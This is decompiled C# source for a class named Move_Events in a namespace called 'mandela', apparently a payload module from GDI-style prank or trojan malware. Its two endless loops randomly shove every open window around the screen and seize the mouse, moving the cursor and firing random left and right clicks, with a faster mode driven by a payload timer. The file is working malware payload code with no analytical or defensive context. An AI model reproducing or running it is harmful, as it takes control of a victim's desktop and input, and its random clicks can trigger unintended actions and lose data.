using System;
using System.Threading;
using System.Windows.Forms;
using CsharpGDI;

namespace mandela
{
	// Token: 0x02000010 RID: 16
	public class Move_Events : gdi32
	{
		// Token: 0x0600003C RID: 60 RVA: 0x00006470 File Offset: 0x00004670
		public void move_window()
		{
			for (;;)
			{
				this.random_0 = new Random();
				this.intptr_0 = gdi32.GetTopWindow(gdi32.GetDesktopWindow());
				this.intptr_0 = gdi32.GetWindow(this.intptr_0, gdi32.GetWindowType.GW_HWNDLAST);
				while (this.intptr_0 != IntPtr.Zero)
				{
					gdi32.RECT rect;
					gdi32.GetWindowRect(this.intptr_0, out rect);
					gdi32.MoveWindow(this.intptr_0, rect.Left + this.random_0.Next(-100, 100), rect.Top + this.random_0.Next(-100, 100), rect.Right - rect.Left, rect.Bottom - rect.Top, true);
					if (this.random_0.Next(500) == 1)
					{
						gdi32.SetWindowPos(this.intptr_0, IntPtr.Zero, this.random_0.Next(this.int_0), this.random_0.Next(this.int_1), rect.Right - rect.Left, rect.Bottom - rect.Top, 64U);
					}
					this.intptr_0 = gdi32.GetWindow(this.intptr_0, gdi32.GetWindowType.GW_HWNDPREV);
				}
				if (Payload_Timer.rapid)
				{
					Thread.Sleep(10);
				}
				else
				{
					Thread.Sleep(500);
				}
			}
		}

		// Token: 0x0600003D RID: 61 RVA: 0x000065C0 File Offset: 0x000047C0
		public void move_mouse()
		{
			for (;;)
			{
				this.random_0 = new Random();
				gdi32.SetCursorPos(this.random_0.Next(this.int_0), this.random_0.Next(this.int_1));
				if (this.random_0.Next(2) == 1)
				{
					gdi32.mouse_event((this.random_0.Next(2) == 1) ? 2U : 4U, this.random_0.Next(this.int_0), this.random_0.Next(this.int_1), 0U, UIntPtr.Zero);
				}
				else
				{
					gdi32.mouse_event((this.random_0.Next(2) == 1) ? 8U : 16U, this.random_0.Next(this.int_0), this.random_0.Next(this.int_1), 0U, UIntPtr.Zero);
				}
				if (Payload_Timer.rapid)
				{
					Thread.Sleep(10);
				}
				else
				{
					Thread.Sleep(this.random_0.Next(800, 3000));
				}
			}
		}

		// Token: 0x04000030 RID: 48
		private IntPtr intptr_0;

		// Token: 0x04000031 RID: 49
		private int int_0 = Screen.PrimaryScreen.Bounds.Width;

		// Token: 0x04000032 RID: 50
		private int int_1 = Screen.PrimaryScreen.Bounds.Height;

		// Token: 0x04000033 RID: 51
		private Random random_0;
	}
}
